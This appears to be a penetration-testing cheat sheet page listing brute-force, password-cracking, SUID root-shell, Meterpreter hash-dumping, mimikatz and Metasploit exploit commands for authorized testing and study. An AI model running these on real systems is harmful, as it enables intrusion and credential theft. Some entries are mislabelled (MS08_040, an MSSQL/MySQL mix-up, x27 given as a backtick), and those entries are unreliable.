+<h2 id="http--https-webserver-enumeration">HTTP / HTTPS Webserver Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#http--https-webserver-enumeration"><i class="fa fa-link"></i></a></h2>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>nikto -h 192.168.1.1</code></p>
+</td>
+<td>
+<p>Perform a nikto scan against target</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>dirbuster</code></p>
+</td>
+<td>
+<p>Configure via GUI, CLI input doesn't work most of the time</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="packet-inspection">Packet Inspection<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#packet-inspection"><i class="fa fa-link"></i></a></h2>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></p>
+</td>
+<td>
+<p>tcpdump for port 80 on interface eth0, outputs to output.pcap</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="username-enumeration">Username Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#username-enumeration"><i class="fa fa-link"></i></a></h2>
+<p>Some techniques used to remotely enumerate users on a target system.</p>
+<h3 id="smb-user-enumeration">SMB User Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#smb-user-enumeration"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>
+<p><code>python /usr/share/doc/python-impacket-doc/examples<br>/samrdump.py 192.168.XXX.XXX</code></p>
+</td>
+<td>
+<p>Enumerate users from SMB</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></p>
+</td>
+<td>
+<p>RID cycle SMB / enumerate users from SMB</p>
+</td>
+</tr>
+</tbody></table>
+</div>
+<h3 id="snmp-user-enumeration">SNMP User Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#snmp-user-enumeration"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>
+<p><code>snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 <br>|cut -d” “ -f4</code></p>
+</td>
+<td>
+<p>Enmerate users from SNMP</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>python /usr/share/doc/python-impacket-doc/examples/<br>samrdump.py SNMP 192.168.X.XXX</code></p>
+</td>
+<td>
+<p>Enmerate users from SNMP</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt <br>(then grep)</code></p>
+</td>
+<td>
+<p>Search for SNMP servers with nmap, grepable output</p>
+</td>
+</tr>
+</tbody></table>
+</div>
+<h2 id="passwords">Passwords<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#passwords"><i class="fa fa-link"></i></a></h2>
+<h3 id="wordlists">Wordlists<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#wordlists"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>/usr/share/wordlists</code></p>
+</td>
+<td>
+<p>Kali word lists</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="brute-forcing-services">Brute Forcing Services<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#brute-forcing-services"><i class="fa fa-link"></i></a></h2>
+<h3 id="hydra-ftp-brute-force">Hydra FTP Brute Force<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hydra-ftp-brute-force"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <br>192.168.X.XXX ftp -V</code></p>
+</td>
+<td>
+<p>Hydra FTP brute force</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="hydra-pop3-brute-force">Hydra POP3 Brute Force<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hydra-pop3-brute-force"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <br>192.168.X.XXX pop3 -V</code></p>
+</td>
+<td>
+<p>Hydra POP3 brute force</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="hydra-smtp-brute-force">Hydra SMTP Brute Force<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hydra-smtp-brute-force"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></p>
+</td>
+<td>
+<p>Hydra SMTP brute force</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code></p>
+<h2 id="password-cracking">Password Cracking<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#password-cracking"><i class="fa fa-link"></i></a></h2>
+<p>Password cracking penetration testing tools.</p>
+<h3 id="john-the-ripper---jtr">John The Ripper - JTR<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#john-the-ripper---jtr"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></p>
+</td>
+<td>
+<p>JTR password cracking</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>john --format=descrypt --wordlist <br> /usr/share/wordlists/rockyou.txt hash.txt</code></p>
+</td>
+<td>
+<p>JTR forced descrypt cracking with wordlist</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>john --format=descrypt hash --show</code></p>
+</td>
+<td>
+<p>JTR forced descrypt brute force cracking</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="windows-penetration-testing-commands">Windows Penetration Testing Commands<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#windows-penetration-testing-commands"><i class="fa fa-link"></i></a></h2>
+<p>See <strong>Windows Penetration Testing Commands</strong>.</p>
+<h2 id="linux-penetration-testing-commands">Linux Penetration Testing Commands<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#linux-penetration-testing-commands"><i class="fa fa-link"></i></a></h2>
+<p>See Linux Commands Cheat Sheet (right hand menu) for a list of Linux Penetration testing commands, useful for local system enumeration.</p>
+<h2 id="compiling-exploits">Compiling Exploits<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#compiling-exploits"><i class="fa fa-link"></i></a></h2>
+<p>Some notes on compiling exploits.</p>
+<h3 id="identifying-if-c-code-is-for-windows-or-linux">Identifying if C code is for Windows or Linux<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#identifying-if-c-code-is-for-windows-or-linux"><i class="fa fa-link"></i></a></h3>
+<p>C #includes will indicate which OS should be used to build the exploit.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></p>
+</td>
+<td>
+<p>Windows exploit code</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, <br> sys/sockt.h, sys/types.h, unistd.h</code></p>
+</td>
+<td>
+<p>Linux exploit code</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="build-exploit-gcc">Build Exploit GCC<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#build-exploit-gcc"><i class="fa fa-link"></i></a></h3>
+<p>Compile exploit gcc.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>gcc -o exploit exploit.c</code></p>
+</td>
+<td>
+<p>Basic GCC compile</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="gcc-compile-32bit-exploit-on-64bit-kali">GCC Compile 32Bit Exploit on 64Bit Kali<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#gcc-compile-32bit-exploit-on-64bit-kali"><i class="fa fa-link"></i></a></h3>
+<p>Handy for cross compiling 32 bit binaries on 64 bit attacking machines.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>
+<p><code>gcc -m32 exploit.c -o exploit</code></p>
+</td>
+<td>
+<p>Cross compile 32 bit binary on 64 bit Linux</p>
+</td>
+</tr>
+</tbody></table>
+</div>
+<h3 id="compile-windows-exe-on-linux">Compile Windows .exe on Linux<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#compile-windows-exe-on-linux"><i class="fa fa-link"></i></a></h3>
+<p>Build / compile windows exploits on Linux, resulting in a .exe file.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>
+<p><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></p>
+</td>
+<td>
+<p>Compile windows .exe on Linux</p>
+</td>
+</tr>
+</tbody></table>
+</div>
+<h2 id="suid-binary">SUID Binary<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-binary"><i class="fa fa-link"></i></a></h2>
+<p>Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.</p>
+<p>below are some quick copy and pate examples for various shells:</p>
+<h3 id="suid-c-shell-for-binbash">SUID C Shell for /bin/bash<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-c-shell-for-binbash"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+       <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+       <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+<span class="p">}</span>       </code></pre></figure>
+<h3 id="suid-c-shell-for-binsh">SUID C Shell for /bin/sh<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-c-shell-for-binsh"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+       <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+       <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>       </code></pre></figure>
+<h3 id="building-the-suid-shell-binary">Building the SUID Shell binary<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#building-the-suid-shell-binary"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gcc -o suid suid.c  </code></pre></figure>
+<p>For 32 bit:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gcc -m32 -o suid suid.c  </code></pre></figure>
+<h2 id="reverse-shells">Reverse Shells<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#reverse-shells"><i class="fa fa-link"></i></a></h2>
+<p>See <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</a> for a list of useful Reverse Shells.</p>
+<h2 id="tty-shells">TTY Shells<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#tty-shells"><i class="fa fa-link"></i></a></h2>
+<p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p>
+<h3 id="python-tty-shell-trick">Python TTY Shell Trick<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#python-tty-shell-trick"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty;pty.spawn("/bin/bash")'</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo </span>os.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span></code></pre></figure>
+<h3 id="spawn-interactive-sh-shell">Spawn Interactive sh shell<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-interactive-sh-shell"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/bin/sh -i</code></pre></figure>
+<h3 id="spawn-perl-tty-shell">Spawn Perl TTY Shell<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-perl-tty-shell"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="nb">exec</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+<span class="nv">perl</span> <span class="err">—</span><span class="nv">e</span> <span class="s">'exec "/bin/sh";'</span></code></pre></figure>
+<h3 id="spawn-ruby-tty-shell">Spawn Ruby TTY Shell<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-ruby-tty-shell"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">exec</span> <span class="s2">"/bin/sh"</span></code></pre></figure>
+<h3 id="spawn-lua-tty-shell">Spawn Lua TTY Shell<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-lua-tty-shell"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-lua" data-lang="lua"><span class="nb">os.execute</span><span class="p">(</span><span class="s1">'/bin/sh'</span><span class="p">)</span></code></pre></figure>
+<h3 id="spawn-tty-shell-from-vi">Spawn TTY Shell from Vi<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-tty-shell-from-vi"><i class="fa fa-link"></i></a></h3>
+<p>Run shell commands from vi:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">:!bash</code></pre></figure>
+<h3 id="spawn-tty-shell-nmap">Spawn TTY Shell NMAP<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-tty-shell-nmap"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">!sh</code></pre></figure>
+<h2 id="metasploit-cheat-sheet">Metasploit Cheat Sheet<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-cheat-sheet"><i class="fa fa-link"></i></a></h2>
+<p>A basic metasploit cheat sheet that I have found handy for reference.</p>
+<p>Basic Metasploit commands, useful for reference, for pivoting see - <a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/">Meterpreter Pivoting</a> techniques.</p>
+<h3 id="meterpreter-payloads">Meterpreter Payloads<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#meterpreter-payloads"><i class="fa fa-link"></i></a></h3>
+<h3 id="windows-reverse-meterpreter-payload">Windows reverse meterpreter payload<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#windows-reverse-meterpreter-payload"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>set payload windows/meterpreter/reverse_tcp</code></p>
+</td>
+<td>
+<p>Windows reverse tcp payload</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="windows-vnc-meterpreter-payload">Windows VNC Meterpreter payload<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#windows-vnc-meterpreter-payload"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>set payload windows/vncinject/reverse_tcp</code></p>
+<p><code>set ViewOnly false</code></p>
+</td>
+<td>
+<p>Meterpreter Windows VNC Payload</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="linux-reverse-meterpreter-payload">Linux Reverse Meterpreter payload<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#linux-reverse-meterpreter-payload"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>set payload linux/meterpreter/reverse_tcp</code></p>
+</td>
+<td>
+<p>Meterpreter Linux Reverse Payload</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="meterpreter-cheat-sheet">Meterpreter Cheat Sheet<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#meterpreter-cheat-sheet"><i class="fa fa-link"></i></a></h2>
+<p>Useful meterpreter commands.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>upload file c:\\windows</code></p>
+</td>
+<td>
+<p>Meterpreter upload file to Windows target</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>download c:\\windows\\repair\\sam /tmp</code></p>
+</td>
+<td>
+<p>Meterpreter download file from Windows target</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>download c:\\windows\\repair\\sam /tmp</code></p>
+</td>
+<td>
+<p>Meterpreter download file from Windows target</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>execute -f c:\\windows\temp\exploit.exe</code></p>
+</td>
+<td>
+<p>Meterpreter run .exe on target - handy for executing uploaded exploits</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>execute -f cmd -c </code></p>
+</td>
+<td>
+<p>Creates new channel with cmd shell</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>ps</code></p>
+</td>
+<td>
+<p>Meterpreter show processes</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>shell</code></p>
+</td>
+<td>
+<p>Meterpreter get shell on the target</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>getsystem</code></p>
+</td>
+<td>
+<p>Meterpreter attempts priviledge escalation the target</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>hashdump</code></p>
+</td>
+<td>
+<p>Meterpreter attempts to dump the hashes on the target</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>portfwd add –l 3389 –p 3389 –r target</code></p>
+</td>
+<td>
+<p>Meterpreter create port forward to target machine</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>portfwd delete –l 3389 –p 3389 –r target</code></p>
+</td>
+<td>
+<p>Meterpreter delete port forward</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="common-metasploit-modules">Common Metasploit Modules<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#common-metasploit-modules"><i class="fa fa-link"></i></a></h2>
+<p>Top metasploit modules.</p>
+<h3 id="remote-windows-metasploit-modules-exploits">Remote Windows Metasploit Modules (exploits)<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#remote-windows-metasploit-modules-exploits"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>use exploit/windows/smb/ms08_067_netapi</code></p>
+</td>
+<td>
+<p>MS08_067 Windows 2k, XP, 2003 Remote Exploit</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use exploit/windows/dcerpc/ms06_040_netapi</code></p>
+</td>
+<td>
+<p>MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use exploit/windows/smb/<br>ms09_050_smb2_negotiate_func_index</code></p>
+</td>
+<td>
+<p>MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="local-windows-metasploit-modules-exploits">Local Windows Metasploit Modules (exploits)<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#local-windows-metasploit-modules-exploits"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>use exploit/windows/local/bypassuac</code></p>
+</td>
+<td>
+<p>Bypass UAC on Windows 7 + Set target + arch, x86/64</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="auxilary-metasploit-modules">Auxilary Metasploit Modules<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#auxilary-metasploit-modules"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>
+<p><code>use auxiliary/scanner/http/dir_scanner</code></p>
+</td>
+<td>
+<p>Metasploit HTTP directory scanner</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use auxiliary/scanner/http/jboss_vulnscan</code></p>
+</td>
+<td>
+<p>Metasploit JBOSS vulnerability scanner</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use auxiliary/scanner/mssql/mssql_login</code></p>
+</td>
+<td>
+<p>Metasploit MSSQL Credential Scanner</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use auxiliary/scanner/mysql/mysql_version</code></p>
+</td>
+<td>
+<p>Metasploit MSSQL Version Scanner</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use auxiliary/scanner/oracle/oracle_login</code></p>
+</td>
+<td>
+<p>Metasploit Oracle Login Module</p>
+</td>
+</tr>
+</tbody></table>
+</div>
+<h3 id="metasploit-powershell-modules">Metasploit Powershell Modules<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-powershell-modules"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>use exploit/multi/script/web_delivery</code></p>
+</td>
+<td>
+<p>Metasploit powershell payload delivery module</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>post/windows/manage/powershell/exec_powershell</code></p>
+</td>
+<td>
+<p>Metasploit upload and run powershell script through a session</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use exploit/multi/http/jboss_maindeployer</code></p>
+</td>
+<td>
+<p>Metasploit JBOSS deploy</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use exploit/windows/mssql/mssql_payload</code></p>
+</td>
+<td>
+<p>Metasploit MSSQL payload</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="post-exploit-windows-metasploit-modules">Post Exploit Windows Metasploit Modules<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#post-exploit-windows-metasploit-modules"><i class="fa fa-link"></i></a></h3>
+<p>Windows Metasploit Modules for privilege escalation.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>run post/windows/gather/win_privs</code></p>
+</td>
+<td>
+<p>Metasploit show privileges of current user</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>use post/windows/gather/credentials/gpp</code></p>
+</td>
+<td>
+<p>Metasploit grab GPP saved passwords</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>load mimikatz -&gt; wdigest</code></p>
+</td>
+<td>
+<p>Metasplit load Mimikatz</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>run post/windows/gather/local_admin_search_enum</code></p>
+</td>
+<td>
+<p>Idenitfy other machines that the supplied domain user has administrative access to</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>run post/windows/gather/smart_hashdump</code></p>
+</td>
+<td>
+<p>Automated dumping of sam file, tries to esc privileges etc</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="ascii-table-cheat-sheet">ASCII Table Cheat Sheet<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ascii-table-cheat-sheet"><i class="fa fa-link"></i></a></h2>
+<p>Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>ASCII</th>
+<th>Character</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>x00</code></p>
+</td>
+<td>
+<p>Null Byte</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x08</code></p>
+</td>
+<td>
+<p>BS</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x09</code></p>
+</td>
+<td>
+<p>TAB</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x0a</code></p>
+</td>
+<td>
+<p>LF</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x0d</code></p>
+</td>
+<td>
+<p>CR</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x1b</code></p>
+</td>
+<td>
+<p>ESC</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x20</code></p>
+</td>
+<td>
+<p>SPC</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x21</code></p>
+</td>
+<td>
+<p>!</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x22</code></p>
+</td>
+<td>
+<p>"</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x23</code></p>
+</td>
+<td>
+<p>#</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x24</code></p>
+</td>
+<td>
+<p>$</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x25</code></p>
+</td>
+<td>
+<p>%</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x26</code></p>
+</td>
+<td>
+<p>&amp;</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x27</code></p>
+</td>
+<td>
+<p>`</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x28</code></p>
+</td>
+<td>
+<p>(</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x29</code></p>
+</td>
+<td>
+<p>)</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x2a</code></p>
+</td>
+<td>
+<p>*</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x2b</code></p>
+</td>
+<td>
+<p>+</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x2c</code></p>
+</td>
+<td>
+<p>,</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x2d</code></p>
+</td>
+<td>
+<p>-</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x2e</code></p>
+</td>
+<td>
+<p>.</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x2f</code></p>
+</td>
+<td>
+<p>/</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x30</code></p>
+</td>
+<td>
+<p>0</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x31</code></p>
+</td>
+<td>
+<p>1</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x32</code></p>
+</td>
+<td>
+<p>2</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x33</code></p>
+</td>
+<td>
+<p>3</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x34</code></p>
+</td>
+<td>
+<p>4</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x35</code></p>
+</td>
+<td>
+<p>5</p>
+</td>
+</tr>
